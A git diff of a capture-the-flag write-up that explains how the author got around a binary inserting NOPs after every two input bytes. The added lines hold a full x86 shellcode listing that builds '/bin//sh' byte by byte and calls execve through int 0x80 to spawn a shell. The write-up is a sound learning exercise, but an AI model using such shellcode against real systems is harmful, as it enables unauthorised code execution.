@@ -74,11 +74,9 @@ gef➤  hexdump byte eax
 ```
 (wow you could hexdump in gef, neat)
 
-alright, we got the basic idea of what's happening. when we give an input till the execute function is called the input is sitting in eax. Then after the execute function the input after every two bytes there are two [NOP](https://en.wikipedia.org/wiki/NOP_(code)) inserted. And when we send that altered input, we get a segmentation fault. So our current objectives are
-1) send input without the NOP or making it ignore the NOP
-2) somehow find the flag in this netcat
+alright, we got the basic idea of what's happening. when we give an input till the execute function is called the input is sitting in eax. Then after the execute function the input after every two bytes there are two [NOP](https://en.wikipedia.org/wiki/NOP_(code)) inserted. And when we send that altered input, we get a segmentation fault. 
 
-let's tackle the second one first, if we want to search for the flag we need a terminal. so we need a shell. and after googling (who am i fooling i saw another writeup) we can use `/bin/sh` command to make a shell for us. So we need use [syscalls](https://asm.sourceforge.net/syscall.html) to send a command. me with 0 knowledge of this googled and found [shell-storm](http://shell-storm.org/). Basically there are bunch of shellcodes already made that you could just copy paste and exploit. But problem is the code breaks after 2 bytes so all our commands need to be exactly 2 bytes. Found this 28 bytes shell code from this [link](http://shell-storm.org/shellcode/files/shellcode-811.html) which mostly has 2 bytes.
+let's tackle how we are going to find the flag, if we want to search for the flag we need a terminal. so we need a shell. and after googling (who am i fooling i saw another writeup) we can use `/bin/sh` command to make a shell for us. So we need use [syscalls](https://asm.sourceforge.net/syscall.html) to send a command. me with 0 knowledge of this googled and found [shell-storm](http://shell-storm.org/). Basically there are bunch of shellcodes already made that you could just copy paste and exploit. But problem is the code breaks after 2 bytes so all our commands need to be exactly 2 bytes. Found this 28 bytes shell code from this [link](http://shell-storm.org/shellcode/files/shellcode-811.html) which mostly has 2 bytes.
 
 ```
 8048060: 31 c0                 xor    eax,eax
@@ -113,7 +111,95 @@ cd 80                 int    0x80
 90                    nop
 cd 80                 int    0x80
 ```
-now the tricky part is the big chunk of push we need to change. what we could do is put it in eax after clearing it, input 2 bytes, shift those 2 bytes, put the next 2 bytes, shift the whole thing, rinse and repeat, until we have the whole thing and push it. did some editing.
+now the tricky part is the big chunk of push we need to change. what we could do is put it in eax after clearing it, input 2 bytes, shift those 2 bytes, put the next 2 bytes, shift the whole thing, rinse and repeat, until we have the whole thing and push it.
+```
+0:  31 c0                   xor    eax,eax
+2:  31 c9                   xor    ecx,ecx
+4:  50                      push   eax
+5:  90                      nop
+6:  31 c0                   xor    eax,eax
+8:  b1 68                   mov    cl,0x68
+a:  01 c8                   add    eax,ecx
+c:  d1 e0                   shl    eax,1
+e:  d1 e0                   shl    eax,1
+10: d1 e0                   shl    eax,1
+12: d1 e0                   shl    eax,1
+14: d1 e0                   shl    eax,1
+16: d1 e0                   shl    eax,1
+18: d1 e0                   shl    eax,1
+1a: d1 e0                   shl    eax,1
+1c: b1 73                   mov    cl,0x73
+1e: 01 c8                   add    eax,ecx
+20: d1 e0                   shl    eax,1
+22: d1 e0                   shl    eax,1
+24: d1 e0                   shl    eax,1
+26: d1 e0                   shl    eax,1
+28: d1 e0                   shl    eax,1
+2a: d1 e0                   shl    eax,1
+2c: d1 e0                   shl    eax,1
+2e: d1 e0                   shl    eax,1
+30: b1 2f                   mov    cl,0x2f
+32: 01 c8                   add    eax,ecx
+34: d1 e0                   shl    eax,1
+36: d1 e0                   shl    eax,1
+38: d1 e0                   shl    eax,1
+3a: d1 e0                   shl    eax,1
+3c: d1 e0                   shl    eax,1
+3e: d1 e0                   shl    eax,1
+40: d1 e0                   shl    eax,1
+42: d1 e0                   shl    eax,1
+44: b1 2f                   mov    cl,0x2f
+46: 01 c8                   add    eax,ecx
+48: 50                      push   eax
+49: 90                      nop
+4a: 31 c0                   xor    eax,eax
+4c: b1 6e                   mov    cl,0x6e
+4e: 01 c8                   add    eax,ecx
+50: d1 e0                   shl    eax,1
+52: d1 e0                   shl    eax,1
+54: d1 e0                   shl    eax,1
+56: d1 e0                   shl    eax,1
+58: d1 e0                   shl    eax,1
+5a: d1 e0                   shl    eax,1
+5c: d1 e0                   shl    eax,1
+5e: d1 e0                   shl    eax,1
+60: b1 69                   mov    cl,0x69
+62: 01 c8                   add    eax,ecx
+64: d1 e0                   shl    eax,1
+66: d1 e0                   shl    eax,1
+68: d1 e0                   shl    eax,1
+6a: d1 e0                   shl    eax,1
+6c: d1 e0                   shl    eax,1
+6e: d1 e0                   shl    eax,1
+70: d1 e0                   shl    eax,1
+72: d1 e0                   shl    eax,1
+74: b1 62                   mov    cl,0x62
+76: 01 c8                   add    eax,ecx
+78: d1 e0                   shl    eax,1
+7a: d1 e0                   shl    eax,1
+7c: d1 e0                   shl    eax,1
+7e: d1 e0                   shl    eax,1
+80: d1 e0                   shl    eax,1
+82: d1 e0                   shl    eax,1
+84: d1 e0                   shl    eax,1
+86: d1 e0                   shl    eax,1
+88: b1 2f                   mov    cl,0x2f
+8a: 01 c8                   add    eax,ecx
+8c: 50                      push   eax
+8d: 90                      nop
+8e: 31 c0                   xor    eax,eax
+90: 89 e3                   mov    ebx,esp
+92: 89 c1                   mov    ecx,eax
+94: 89 c2                   mov    edx,eax
+96: b0 0b                   mov    al,0xb
+98: cd 80                   int    0x80
+9a: 31 c0                   xor    eax,eax
+9c: 40                      inc    eax
+9d: 90                      nop
+9e: cd 80                   int    0x80
+```
+This took hours to get because the disassembler needs other formatting and ran into some problems like the commands were wrong in that shellcode so had to find the correct to code to run. anyway here is the actual assembly code i ran in a dissasembler
+
 ```
 xor    %eax,%eax
 xor    %ecx,%ecx
